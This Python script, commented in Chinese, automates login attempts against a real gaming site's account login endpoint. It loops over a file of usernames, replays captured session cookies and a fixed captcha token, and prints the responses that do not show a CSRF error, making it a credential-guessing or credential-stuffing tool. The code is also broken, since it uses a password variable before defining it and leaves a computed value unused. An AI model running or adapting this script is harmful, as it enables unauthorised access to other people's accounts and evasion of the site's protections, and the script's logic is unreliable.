import requests
import re  # 引入正則表達式模組

# 定義要發送的用戶名和密碼列表
with open("666.txt", "r", encoding="utf-8") as file:
    usernames = [line.strip() for line in file if line.strip()]

# Cookies 設定
cookies = {
    "_ga": "GA1.1.1957928680.1732967366",
    "ckM": "2531167198",
    "buap_modr": "p014",
    "buap_puoo": "p301",
    "ckGUILD_lastBrowse": "[[%22393%22%2C%22%E6%AD%B7%E5%8F%B2%E3%81%AE%E7%B4%B3%E5%A3%AB%E5%85%AC%E6%9C%83<%E3%82%9D%CF%89%E3%83%BB%22]%2C[%2216197%22%2C%22%E5%A0%B4%E5%A4%96%E4%BA%BA%E7%94%9F%22]]",
    "__cf_bm": "mKDJpSKveQTKgl_fc6yuPtBbSyXcrhujBogkMvHPNso-1734356145-1.0.1.1-Q4xXxyx1VD13BCae5ygrGeY76tskUbcg3HDEXHnwcFUld5j1UZ_lbQKNVUun8pDMU5CvDEDJrPkzKFVo9ivUpA",
    # 添加其他需要的 cookies
}

# Headers 設定
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Accept": "*/*",
    "Accept-Encoding": "gzip, deflate, br, zstd",
    "Accept-Language": "zh-TW,zh;q=0.9,ja-JP;q=0.8,ja;q=0.7",
    "Cache-Control": "no-cache",
    "Origin": "https://user.gamer.com.tw",
    "Pragma": "no-cache",
    "Referer": "https://user.gamer.com.tw/login.php",
    "X-Requested-With": "XMLHttpRequest",
    "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryMzmKAzfvUWXFT4Ag"
}

# URL
url = "https://user.gamer.com.tw/ajax/do_login.php"

# 遍歷用戶名列表並發送請求
for i in usernames:
    # 替換所有字母為 'a'
    c = re.sub(r'[a-zA-Z]', 'a', i)

    body = f"""
------WebKitFormBoundaryMzmKAzfvUWXFT4Ag
Content-Disposition: form-data; name="userid"

{i}
------WebKitFormBoundaryMzmKAzfvUWXFT4Ag
Content-Disposition: form-data; name="password"

{b}
------WebKitFormBoundaryMzmKAzfvUWXFT4Ag
Content-Disposition: form-data; name="autoLogin"

T
------WebKitFormBoundaryMzmKAzfvUWXFT4Ag
Content-Disposition: form-data; name="alternativeCaptcha"

01abb4943549791de400663547b2795feed2f1cf53b98d5067602cb6
------WebKitFormBoundaryMzmKAzfvUWXFT4Ag
Content-Disposition: form-data; name="twoStepAuth"


------WebKitFormBoundaryMzmKAzfvUWXFT4Ag--
"""

    response = requests.post(url, headers=headers, cookies=cookies, data=body.encode("utf-8"))

    # 過濾特定的錯誤回應
    if '"CSRF_TOKEN_ERROR"' not in response.text:
        print(f"Username: {i}, Password: {b}, Status Code: {response.status_code}")
        print("Response:", response.text)
    else:
        b=1
        

